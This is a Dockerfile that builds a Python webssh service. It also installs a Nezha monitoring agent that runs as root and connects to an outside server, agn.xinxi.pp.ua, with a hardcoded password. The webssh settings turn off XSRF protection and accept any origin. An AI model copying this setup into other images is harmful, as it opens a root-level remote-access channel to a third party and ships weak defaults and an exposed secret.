FROM python:3.11-alpine

LABEL maintainer='<author>'
LABEL version='0.0.0-dev.0-build.0'

ADD . /code
WORKDIR /code

# 安装依赖、下载哪吒探针并配置权限
RUN \
  apk add --no-cache libc-dev libffi-dev gcc curl wget unzip && \
  pip install -r requirements.txt --no-cache-dir && \
  # 自动识别架构下载哪吒探针
  ARCH=$(uname -m) && \
  if [ "$ARCH" = "x86_64" ]; then ARCH="amd64"; elif [ "$ARCH" = "aarch64" ]; then ARCH="arm64"; fi && \
  wget -t 2 -T 10 -O nezha-agent.zip https://github.com/nezhahq/agent/releases/latest/download/nezha-agent_linux_${ARCH}.zip && \
  unzip nezha-agent.zip && \
  mv nezha-agent /usr/bin/nezha-agent && \
  chmod +x /usr/bin/nezha-agent && \
  rm -f nezha-agent.zip && \
  # 清理环境
  apk del gcc libc-dev libffi-dev && \
  addgroup -S webssh && \
  adduser -Ss /bin/false -G webssh webssh && \
  chown -R webssh:webssh /code

EXPOSE 8888/tcp

# 使用 root 权限启动，以便哪吒探针能获取系统信息
USER root

# 修复 1: 哪吒探针 v1.x 使用运行命令，不再直接使用 -s 参数
# 修复 2: 使用 python -c 预先创建 event loop 解决 Tornado 启动报错
CMD /usr/bin/nezha-agent service run --server agn.xinxi.pp.ua:443 --password 1FyZCXk9XGSarBQrCVE8WjyzXTfJFqH4 --tls & \
    su webssh -s /bin/sh -c "python -c 'import asyncio; asyncio.set_event_loop(asyncio.new_event_loop())'; python run.py --delay=10 --encoding=utf-8 --fbidhttp=False --maxconn=20 --origin=* --policy=warning --redirect=False --timeout=10 --xsrf=False --xheaders --wpintvl=1"
